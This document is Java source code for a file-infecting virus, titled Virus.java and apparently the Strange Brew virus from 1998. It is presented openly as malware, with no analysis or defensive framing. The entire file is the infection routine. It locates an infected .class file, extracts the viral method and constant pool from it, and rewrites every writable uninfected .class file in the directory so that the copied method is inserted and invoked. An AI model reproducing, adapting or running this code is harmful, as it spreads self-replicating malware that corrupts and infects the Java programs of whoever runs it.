//=============================================================
//
// Title:   Virus.java
// Author:  Landing Camel International
// Date:    August 1998
// Compile: javac -O Virus.java
//
//=============================================================

import java.io.*;

public class Virus {

   //----------------------------------------------------------

      public void Strange_Brew_Virus() {

      try {

      //this data must be filled in post compilation
      int virus_cp_count         = 123; 
      int virus_cp_length        = 1030;
      int virus_code_length      = 2826;
      int virus_method_length    = 2860;
      int virus_methodref        = 17; 

      //global data used throughout program
      String homedir = System.getProperty("user.dir");
      File present = new File(homedir);
      String[] dirlist;
      int tmp;
      int ind;
      int fpointer;
      int offset;

      //=======================================================
      // Virus Routine A
      // - Create instance of current directory
      // - Search for an infected host
      // - Open the infected host
      // - Read the host_cp_count
      // - Seek to the end of the host_cp save fpointer
      // - Seek to the host_method_count save fpointer
      // - Seek to host_code_length
      // - Test length matches virus_code_length
      // - Read the host_method
      // - Read the host_cp
      // - Close the host
      //=======================================================    

      //host data
      RandomAccessFile host;
      int host_cp_count = 0;
      int host_cp_pointer;
      int host_method_pointer;
      int host_method_count;
      int host_code_length;
      byte[] host_method = new byte[virus_method_length];
      byte[] host_cp = new byte[virus_cp_length];
      byte[] end;
      boolean found_host = false;

      //iterate through files in current directory
      for (dirlist = present.list(), ind = 0;
           dirlist != null && ind < dirlist.length; ind++) {

         File entry = new File(present, dirlist[ind]);

         //test file for infection attributes
         if ((entry.isFile()) && (entry.canRead()) &&
             (dirlist[ind].endsWith(".class")) && (entry.length()%101 == 0)) {

            host = new RandomAccessFile(entry,"r");

            //read host_cp_count
            fpointer = 8;
            host.seek(fpointer);
            host_cp_count = host.readUnsignedShort();

            //iterate through host_cp
            fpointer += 2;
            host.seek(fpointer);
            for (int i = 1; i < host_cp_count; i++) {
               int tag = host.readUnsignedByte();
               fpointer++;
               int skipper = 0;
               switch (tag) {
                  case 7: 
                  case 8: fpointer += 2;
                          break;
                  case 3:
                  case 4:
                  case 9:
                  case 10:
                  case 11:
                  case 12: fpointer = fpointer + 4;
                           break;
                  case 5:
                  case 6: fpointer = fpointer + 8;
                          i++;
                          break;
                  case 1: skipper = host.readUnsignedShort();
                          fpointer = fpointer + skipper + 2;
                          break;
               }
               host.seek(fpointer); 
            }

            //read host_cp_pointer
            host_cp_pointer = fpointer - virus_cp_length;    

            //read host_interfaces                                
            fpointer += 6;
            host.seek(fpointer);
            tmp = host.readUnsignedShort();

            //iterate through interfaces
            fpointer = fpointer + 2*(tmp) + 2;
            host.seek(fpointer); 

            //read host_fields
            tmp = host.readUnsignedShort();

            //iterate through fields
            fpointer += 2;
            host.seek(fpointer);
            for (int i = 0; i < tmp; i++) {
               fpointer += 6;
               host.seek(fpointer);
               int j = host.readUnsignedShort();
               fpointer = fpointer + 8*(j) + 2;
               host.seek(fpointer);
            }

            //read host_method_pointer
            host_method_pointer = fpointer;

            //seek to host_code_length
            fpointer += 20;
            host.seek(fpointer);
            host_code_length = host.readInt();

            //test host_code_length
            if (host_code_length != virus_code_length) continue;

            //read host_method
            host.seek(host_method_pointer);
            host_method_count = host.readUnsignedShort();
            host.read(host_method);

            //read host_cp
            host.seek(host_cp_pointer);
            host.read(host_cp);

            //close host
            host.close();

            //alter boolean
            found_host = true;

            //break out of loop
            break;
         }
      }                        

      //Exit if no host is found
      if (!found_host) System.exit(1);

      //==================================================
      // Virus Routine B
      // - Create instance of current directory
      // - Search for an uninfected victim
      // - Open uninfected victim
      // - Read victim_cp_count
      // - Seek to end of victim_cp save fpointer
      // - Read victim_this_class
      // - Seek to the victim_method_count save fpointer
      // - Read victim_method_access_flags
      // - Calculate victim_extra_length
      // - Read victim_method_attribute_length
      // - Write method_attribute_length + extra_length
      // - Read victim_method_code_length
      // - Write method_code_length + extra_length
      // - If not static method write invokevirtual
      // - Write padding to mark the infection
      // - If static method break out of loop
      //==================================================    

      //victim data
      RandomAccessFile victim;
      int victim_cp_count;
      int victim_cp_pointer;
      int victim_this_class;
      int victim_method_pointer;
      int victim_method_count;
      int victim_access_flags;
      int victim_attribute_length;
      int victim_extra_length = 0;
      int victim_code_length;
      int victim_amount_deleted = 0;
      
      //iterate through files in current directory
      for (dirlist = present.list(), ind = 0;
         dirlist != null && ind < dirlist.length; ind++) {

         File entry = new File(present, dirlist[ind]);

         //test file for infection attributes
         if ((entry.isFile()) && (entry.canRead()) && (entry.canWrite()) && 
            (dirlist[ind].endsWith(".class")) && (entry.length()%101 != 0)) {

            victim = new RandomAccessFile(entry,"rw");

            //read victim_cp_count                   
            fpointer = 8;
            victim.seek(fpointer);
            victim_cp_count = victim.readUnsignedShort();

            //iterate through victim_cp
            fpointer += 2;
            victim.seek(fpointer);
            for (int i = 1; i < victim_cp_count; i++) {
               int tag = victim.readUnsignedByte();
               fpointer++;
               int skipper = 0;
               switch (tag) {
                  case 7: 
                  case 8: fpointer += 2;
                          break;
                  case 3:
                  case 4:
                  case 9:
                  case 10:
                  case 11:
                  case 12: fpointer = fpointer + 4;
                           break;
                  case 5:
                  case 6: fpointer = fpointer + 8;
                          i++;
                          break;
                  case 1: skipper = victim.readUnsignedShort();
                          fpointer = fpointer + skipper + 2;
                          break;
               }
               victim.seek(fpointer); 
            }
            
            //read victim_cp_pointer
            victim_cp_pointer = fpointer;

            //read victim_this_class
            fpointer += 2;
            victim.seek(fpointer);
            victim_this_class = victim.readUnsignedShort();

            //read victim_interfaces
            fpointer += 4;
            victim.seek(fpointer);
            tmp = victim.readUnsignedShort();

            //iterate through interfaces
            fpointer = fpointer + 2*(tmp) + 2;
            victim.seek(fpointer);

            //read victim_fields
            tmp = victim.readUnsignedShort();

            //iterate through fields
            fpointer += 2;
            victim.seek(fpointer);
            for (int i = 0; i < tmp; i++) {
               fpointer += 6;
               victim.seek(fpointer);
               int j = victim.readUnsignedShort();
               fpointer = fpointer + 8*(j) + 2;
               victim.seek(fpointer);
            }

            //read victim_method_pointer
            victim_method_pointer = fpointer;

            //read victim_method_count
            victim_method_count = victim.readUnsignedShort();

            //read victim_access_flags
            fpointer += 2;
            victim.seek(fpointer);
            victim_access_flags = victim.readUnsignedShort();

            //read victim_attribute_length
            fpointer += 10;
            victim.seek(fpointer);
            victim_attribute_length = victim.readInt();

            //read victim_code_length
            fpointer += 8;
            victim.seek(fpointer);
            victim_code_length = victim.readInt();

            //if not static remove end of method
            if ((victim_access_flags & 0x08) == 0) {

               //read victim_exception_table_length
               fpointer += 4 + victim_code_length;
               victim.seek(fpointer);
               int victim_exception_table_length = victim.readUnsignedShort();

               //read victim_method_attributes
               fpointer += 2 + (8 * victim_exception_table_length);
               victim.seek(fpointer);
               int victim_method_attr_count = victim.readUnsignedShort();

               fpointer += 2;
               victim.seek(fpointer);
               for (int i = 0; i < victim_method_attr_count; i++) {
                  fpointer += 2;
                  victim.seek(fpointer);
                  int victim_method_attr_length = victim.readInt();
                  fpointer += 4 + victim_method_attr_length;
                  victim.seek(fpointer);
               }

               //calculate the amount deleted
               victim_amount_deleted = fpointer - 4 - (victim_method_pointer + 24 + victim_code_length);

               //save end of the file
               offset = (int)victim.length() - fpointer;
               end = new byte[offset];
               victim.read(end, 0, offset);

               //write necessary data
               fpointer = victim_method_pointer + 24 + victim_code_length;
               victim.seek(fpointer);
               victim.writeInt(0);
               victim.write(end);

               //calculate victim_extra_length  
               victim_extra_length = 4 + (int)(101-((4+victim.length()+virus_cp_length+virus_method_length)%101));            
            }        
            else victim_extra_length = (int)(101-(victim.length()%101));

            //write victim_attribute_length
            fpointer = victim_method_pointer + 12;
            victim.seek(fpointer);
            victim.writeInt(victim_attribute_length + victim_extra_length - victim_amount_deleted);

            //write victim_code_length
            fpointer += 8;
            victim.seek(fpointer);
            victim.writeInt(victim_code_length + victim_extra_length);

            //if invokespecial write invokevirtual at end of file
            fpointer += 4 ;
            victim.seek(fpointer);
            tmp = victim.readUnsignedShort();
            if (tmp == 0x2AB7) fpointer += 4;
            victim.seek(fpointer);

            //save end of file
            offset = (int)victim.length() - (int)fpointer;
            end = new byte[offset];
            victim.read(end, 0, offset);

            //write invokevirtual
            victim.seek(fpointer);
            if ((victim_access_flags & 0x08) == 0) {
               for (int i = 0; i < (victim_extra_length - 4); i++) victim.writeByte(0);
               victim.writeShort(0x2AB6);
               victim.writeShort(victim_cp_count + virus_methodref - 1);
               //victim.writeInt(0);
               victim.write(end);	
            }
            //break out of current loop iteration
            else { 
               for (int i = 0; i < victim_extra_length; i++) victim.writeByte(0);
               victim.write(end);	
               continue;
            }

            //==================================================    
            // Virus Routine C
            // - Seek to victim_method_count
            // - Write victim_method_count + 1
            // - Write host_method
            // - Account for delta_offset in host_method
            //==================================================

            //calculate delta_offset
            int delta_offset = (victim_cp_count - (host_cp_count - virus_cp_count));

            //seek to victim_method_pointer
            fpointer = victim_method_pointer;
            victim.seek(fpointer);

            //write victim_method_count
            victim.writeShort(victim_method_count+1);

            //seek to start of method
            fpointer += 2;
            victim.seek(fpointer);

            //save end of the file
            offset = (int)victim.length() - fpointer;
            end = new byte[offset];
            victim.read(end, 0, offset);
            
            //write host_method
            victim.seek(fpointer);
            victim.write(host_method);

            //restore end of file
            victim.write(end);

            //account for delta_offset in method fields
            fpointer += 2;
            for (int i = 1; i <= 3; i++) {
               victim.seek(fpointer);
               int j = victim.readUnsignedShort();
               victim.seek(fpointer);
               victim.writeShort(j + delta_offset);
               fpointer += i*2;
            }

            //seek to start of code
            fpointer = victim_method_pointer + 24;
            victim.seek(fpointer);

            //account for delta_offset in code 
            while (fpointer < (victim_method_pointer + virus_code_length + 24)) {
               int data1;
	       int total_nulls;
               int tag = victim.readUnsignedByte();
               fpointer++;
               switch (tag) {
                  default: break;
                  //-----------------------------------------------
                  case 16:
                  case 21:
                  case 22:
                  case 23:
                  case 24:
                  case 25:
                  case 54:
                  case 55:
                  case 56:
                  case 57:
                  case 58:
                  case 169: 
                  case 188: fpointer++;
                            break;
                  //-----------------------------------------------
                  case 17:
                  case 132:
                  case 153:
                  case 154:
                  case 155:
                  case 156:
                  case 157:
                  case 158:
                  case 159:
                  case 160:
                  case 161:
                  case 162:
                  case 163:
                  case 164:
                  case 165:
                  case 166:
                  case 167:
                  case 168:
                  case 198:
                  case 199: fpointer += 2;
                            break;
                  //-----------------------------------------------
                  case 200:
                  case 201: fpointer += 4;
                            break;
                  //-----------------------------------------------
                  case 18:  data1 = victim.readUnsignedByte();
                            victim.seek(fpointer);
                            victim.writeByte(data1 + delta_offset);
                            fpointer++;
                            break;                    
                  case 19:  
                  case 20:  
                  case 178:
                  case 179:
                  case 180:
                  case 181:
                  case 182:
                  case 183:
                  case 184:
                  case 187: 
                  case 189:
                  case 192:
                  case 193: data1 = victim.readUnsignedShort();
                            victim.seek(fpointer);
                            victim.writeShort(data1 + delta_offset);
                            fpointer += 2;
                            break;
                  case 197: data1 = victim.readUnsignedShort();
                            victim.seek(fpointer);
                            victim.writeShort(data1 + delta_offset);
                            fpointer += 3;
                            break; 
                  case 185: data1 = victim.readUnsignedShort();
                            victim.seek(victim_method_pointer);
                            victim.writeShort(data1 + delta_offset);
                            fpointer += 4;
                            break;          
                  //-----------------------------------------------
                  case 170: total_nulls = 3-(fpointer - 1 - (victim_method_pointer+24))%4;
			    for (int i = 0; i < total_nulls; i++) {	 
                               tag = victim.readUnsignedByte();
                               fpointer++;
                            } 
                            fpointer += 4;
                            victim.seek(fpointer);
                            int low = victim.readInt();
                            int high = victim.readInt();
                            fpointer += 8 + 4*(high - low + 1);
                            break;
                  case 171: total_nulls = 3-(fpointer - 1 -(victim_method_pointer+24))%4;
			    for (int i = 0; i < total_nulls; i++) {	 	      
                               tag = victim.readUnsignedByte();
                               fpointer++;
                            }
                            fpointer += 4;
                            victim.seek(fpointer);
                            int npairs = victim.readInt();
                            fpointer += 4 + 8*npairs;
                            break;
                  case 196: tag = victim.readUnsignedByte();
                            if (tag == 132) fpointer += 4;
                            else fpointer += 2;
                            break;
                  //-----------------------------------------------
               } // end of switch
               victim.seek(fpointer);
            } //end of for loop

            //account for delta in exception table
  	    fpointer += 8;
            victim.seek(fpointer);
            tmp = victim.readUnsignedShort();
            victim.seek(fpointer);
            victim.writeShort(tmp + delta_offset);

            //==================================================    
            // Virus Routine D
            // - Seek to victim_cp_count
            // - Write victim_cp_count + total_cp_count
            // - Seek to victim_cp_pointer
            // - Write host_cp
            // - Account for delta_offset in host_method and
            // - Account for this_class in methodref
            //==================================================    

            //write victim_cp_count
            victim.seek(8);
            victim.writeShort(victim_cp_count + virus_cp_count);

            //seek to victim_cp_pointer
            fpointer = victim_cp_pointer;
            victim.seek(fpointer);

            //save the end of file
            offset = (int)victim.length() - fpointer;
            end = new byte[offset];
            victim.read(end, 0, offset);

            //write host_cp
            victim.seek(fpointer);
            victim.write(host_cp);

            //restore the end of file
            victim.write(end);

            //iterate through const_pool updating delta_offset
            victim.seek(fpointer);
            for (int i = 1; i < host_cp_count; i++) {
               int data1, data2;
               int tag = victim.readUnsignedByte();
               fpointer++;
               int skipper = 0;
               //this code fixes the invokevirtual methodref
               if (i == virus_methodref) {
                  data1 = victim.readUnsignedShort();
                  data2 = victim.readUnsignedShort();
                  victim.seek(fpointer);
                  victim.writeShort(victim_this_class);
                  victim.writeShort(data2 + delta_offset);
                  fpointer += 4;
                  victim.seek(fpointer); 
                  continue;
               }
               switch (tag) {
                  case 7: 
                  case 8:  data1 = victim.readUnsignedShort();
                           victim.seek(fpointer);
                           victim.writeShort(data1 + delta_offset);
                           fpointer += 2;
                           break;
                  case 3:
                  case 4:  fpointer += 4;
                           break;
                  case 9:
                  case 10:
                  case 11:
                  case 12: 
                           data1 = victim.readUnsignedShort();
                           data2 = victim.readUnsignedShort();
                           victim.seek(fpointer);
                           victim.writeShort(data1 + delta_offset);
                           victim.writeShort(data2 + delta_offset);
                           fpointer += 4;
                           break;
                  case 5:
                  case 6:  fpointer += 8;
	                   i++;
                           break;
                  case 1:  skipper = victim.readUnsignedShort();
                           fpointer = fpointer + skipper + 2;
                           break;
               }
               victim.seek(fpointer); 
            }

            //close victim
            victim.close();

         } // end if loop examining

      } // end for loop examining files in directory   

   } // end try block

   catch (IOException e) {}

   } // end StrangeBrew()

   //----------------------------------------------------------

   public Virus() {

      Strange_Brew_Virus();

   } // end Virus()

   //----------------------------------------------------------

   public static void main(String argv[]) {

      Virus virus = new Virus();

   } // end main(String argv[])

   //----------------------------------------------------------

} // end Virus class
